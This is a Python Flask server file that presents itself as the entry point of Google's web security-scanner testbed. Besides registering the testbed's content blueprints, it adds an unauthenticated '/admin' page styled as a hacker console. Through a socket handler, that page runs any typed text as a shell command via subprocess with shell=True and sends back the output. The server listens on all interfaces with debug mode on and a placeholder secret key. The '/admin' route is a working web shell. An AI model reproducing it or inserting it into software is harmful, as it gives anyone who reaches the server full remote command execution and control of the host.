# Copyright 2019 Google LLC. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ==============================================================================
"""The entry point for Flask App serving the testbed"s content."""
import os, subprocess
from blueprints.css import css_module
from blueprints.headers import headers_module
from blueprints.html import html_module
from blueprints.javascript import javascript_module
from blueprints.misc import misc_module
from blueprints.utils import utils_module
from flask import Flask
from flask import make_response
from flask import render_template
from flask_socketio import SocketIO, send, emit

# Modified from https://gist.github.com/Ninja243/40840abde56467b528b5c8582ce23ec8
# (forked from https://gist.github.com/phoemur/461c97aa5af5c785062b7b4db8ca79cd)
# Matrix Rain from https://stackoverflow.com/questions/67136032/how-to-make-the-matrix-background-render-behind-page-content
HTML = '''
<html>
    <head>
        <title>Admin Panel</title>
        <script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha256-tG5mcZUtJsZvyKAxYLVXrmjKBVLd6VpVccqz/r4ypFE=" crossorigin="anonymous"></script>
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js" integrity="sha512-Xm9qbB6Pu06k3PUwPj785dyTl6oHxgsv9nHp7ej7nCpAqGZT3OZpsELuCYX05DdonFpTlBpXMOxjavIAIUwr0w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script type="text/javascript" charset="utf-8">
            var socket;
            $(document).ready(function(){
                {
                    var p = document.createElement('pre');
                    p.textContent = "[*] Connecting..."
                    document.getElementById('admin').appendChild(p);
                }
                socket = io.connect('http://' + location.hostname + ':' + location.port + '/admin');
                socket.on('connect', function() {
                    socket.emit('joined', {});
                });
                socket.on('message', function(data) {
                    var p = document.createElement('pre');
                    p.textContent = data.msg;
                    document.getElementById('admin').appendChild(p);
                });
                socket.on('status', function(data) {
                    var p = document.createElement('pre');
                    p.textContent = data.msg;
                    document.getElementById('admin').appendChild(p);
                });
                $('#text').keypress(function(e) {
                    var code = e.keyCode || e.which;
                    if (code == 13) {
                        text = $('#text').val();
                        $('#text').val('');
                        socket.emit('comando', {msg: text});
                    }
                });
            });
            function leave_room() {
                socket.disconnect();
                window.location.href = 'http://' + location.hostname + ':' + location.port;
            }
        </script>
        <style>
        html {
          color-scheme: dark !important;
        }
        body {
          margin: 0;
          background-color: #000;
        }
        .container {
          background-color: rgba(25, 25, 25, 0.85);
          border-radius: 15px;
          margin: 50px 10%;
          padding: 2rem;
          position: relative;
          z-index: 1;
        }
        #text {
          max-width: 100%;
          border-radius: 5px;
          padding: 0.3rem;
          padding-left: 0.5rem;
        }
        #canv {
          position: fixed;
          top: 0;
          left: 0;
        }
        #exit {
          position: absolute;
          top: 10px;
          right: 12px;
        }
        /* https://www.w3schools.com/Css/tryit.asp?filename=trycss_link_advanced2 */
        a {
          font-family: monospace;
          font-size: 1rem;
          padding: 5px 10px;
          border-radius: 10px;
          text-align: center;
          text-decoration: none;
          display:inline-block;
        }
        a:link, a:visited {
          background-color: inherit;
          color: rgba(255, 255, 255, 0.25);
          border: 2px solid rgba(255, 255, 255, 0.25);
        }
        a:hover, a:active {
          background-color: rgba(100, 0, 0, 0.85);
          color: white;
          border: 2px solid rgba(200, 0, 0, 0.85);
        }
        </style>
    </head>
    <body>
        <div class='container'>
          <div id="admin"></div><br><br>
          <input id="text" size="80" placeholder="Enter command here"><br><br>
          <div id="exit"><a href="#" onclick="leave_room();">EXIT</a></div>
        </div>
        <canvas id='canv'></canvas>
        <script>
        const canvas = document.getElementById('canv');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const ctx = canvas.getContext('2d');
        let cols = Math.floor(window.innerWidth / 20) + 1;
        let ypos = Array(cols).fill(0);

        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        function matrix () {
          const w = window.innerWidth;
          const h = window.innerHeight;

          if (canvas.width !== w) {
            canvas.width = w;
            cols = Math.floor(window.innerWidth / 20) + 1;
            ypos = Array(cols).fill(0);
          }
          if (canvas.height !== h) {
            canvas.height = h;
          }

          ctx.fillStyle = '#0001';
          ctx.fillRect(0, 0, w, h);

          ctx.fillStyle = '#0f0';
          ctx.font = '15pt monospace';

          ypos.forEach((y, ind) => {
            const text = String.fromCharCode(Math.random() * 128);
            const x = ind * 20;
            ctx.fillText(text, x, y);
            if (y > 100 + Math.random() * 10000) ypos[ind] = 0;
            else ypos[ind] = y + 20;
          });
        }
        setInterval(matrix, 50);
        </script>
    </body>
</html>
'''

app = Flask(__name__)
app.register_blueprint(css_module, url_prefix="/css")
app.register_blueprint(headers_module, url_prefix="/headers")
app.register_blueprint(html_module, url_prefix="/html")
app.register_blueprint(javascript_module, url_prefix="/javascript")
app.register_blueprint(misc_module, url_prefix="/misc")
app.register_blueprint(utils_module)
app.config['SECRET_KEY'] = 'CHANGEME'
app.config['DEBUG'] = True
socketio = SocketIO(app)


@app.route("/")
def index():
    return render_template("index.html")

@app.route('/admin')
def admin():
    return HTML#render_template('admin.html')

@socketio.on('joined', namespace='/admin')
def joined(message):
    emit('status', {'msg': '[*] Successfully connected to host'})

@socketio.on('comando', namespace='/admin')
def comando(comando):
    c = comando['msg']
    emit('message', {'msg': '> ' + c})
    print(c)
    try:
        b = subprocess.check_output(c, shell=True).decode()
    except Exception as err:
        b = str(err)
    emit('message', {'msg': b})

@app.route("/robots.txt")
def robots():
  content = "User-agent: *\nDisallow: /test/misc/known-files/robots.txt.found"
  r = make_response(content, 200)
  r.headers["Content-Type"] = "text/plain"
  return r


@app.route("/sitemap.xml")
def sitemap():
  r = make_response(render_template("sitemap.xml"), 200)
  r.headers["Content-Type"] = "application/xml"
  return r


if __name__ == "__main__":
  socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)), allow_unsafe_werkzeug=True)
